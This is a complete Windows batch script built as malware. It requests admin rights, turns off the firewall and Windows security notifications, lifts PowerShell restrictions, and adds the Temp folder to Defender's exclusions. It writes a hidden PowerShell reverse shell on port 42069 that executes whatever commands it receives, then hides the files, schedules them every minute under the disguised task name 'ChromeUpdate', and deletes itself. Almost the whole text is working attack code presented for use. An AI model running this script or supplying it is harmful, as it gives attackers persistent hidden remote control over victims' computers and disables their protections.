@echo off
setlocal enabledelayedexpansion

:: request admin elevation
set "params=%*"
cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) && fsutil dirty query %systemdrive% 1>nul 2>nul || (  echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "cmd.exe", "/c cd ""%~sdp0"" && %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs" && "%temp%\getadmin.vbs" && exit /B )

for /f "tokens=3 delims=\" %%a in ("!cd!") do set "username=%%a"
cd /d "C:\Users\%username%\AppData\Local\Temp"

:: remove powershell script restrictions
powershell -command "Set-ExecutionPolicy Unrestricted -Force" > nul 2>&1

:: disable windows security notifications
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" /v DisableNotifications /t REG_DWORD /d 1 /f > nul 2>&1

:: disable firewall
netsh advfirewall set allprofiles state off >nul 2>&1

:: set up reverse shell
set "taskname=ChromeUpdate"
set "tasksettings=$TaskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable;"
set "file=revsh.ps1"

echo if (netstat -an ^| select-string ":42069") { exit } > %file%
echo $addrs = @(arp -a ^| select-string dynamic ^| foreach-object { ($_.line.trim() -split " ")[0] }); >> %file%
echo foreach ($addr in $addrs) { >> %file%
echo ping $addr -n 2 -w 500; if (^^!$?) { continue } >> %file%
echo try { $client = New-Object System.Net.Sockets.TCPClient($addr, 42069); $stream = $client.GetStream(); [byte[]] $buffer = 0..65535 ^| %%{0}; >> %file%
echo while(($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0){ >> %file%
echo $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer, 0, $i); >> %file%
echo try { $sendback = (iex $data 2^>^&1 ^| Out-String ) + 'PS ' + (pwd).Path + '^> '; } catch { $sendback = "Error: $($_.Exception.Message)`n"; } >> %file%
echo $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback); $stream.Write($sendbyte, 0, $sendbyte.Length); $stream.Flush(); } >> %file%
echo $client.Close(); } catch {} } >> %file%

:: vbs wrapper run in hidden mode
set "wrapper=launch.vbs"

echo Set WshShell = CreateObject("WScript.Shell") > %wrapper%
echo WshShell.Run "powershell -ExecutionPolicy Bypass -File ""%TEMP%\%file%""", 0, False >> %wrapper%

:: hide files and whitelist directory
attrib +h +s +r %file% >nul 2>&1
attrib +h +s +r %wrapper% >nul 2>&1
powershell -command "Add-MpPreference -ExclusionPath \"%TEMP%\"" > nul 2>&1

:: schedule reverse shell to run every minute
schtasks /create /tn "%taskname%" /tr "wscript.exe \"%TEMP%\launch.vbs\"" /sc minute /mo 1 /st 00:00:00 /f > nul 2> nul
powershell -command %tasksettings%"Set-ScheduledTask -TaskName %taskname% -Settings $TaskSettings" > nul

:: delete itself
cd ..
del /f /q %~f0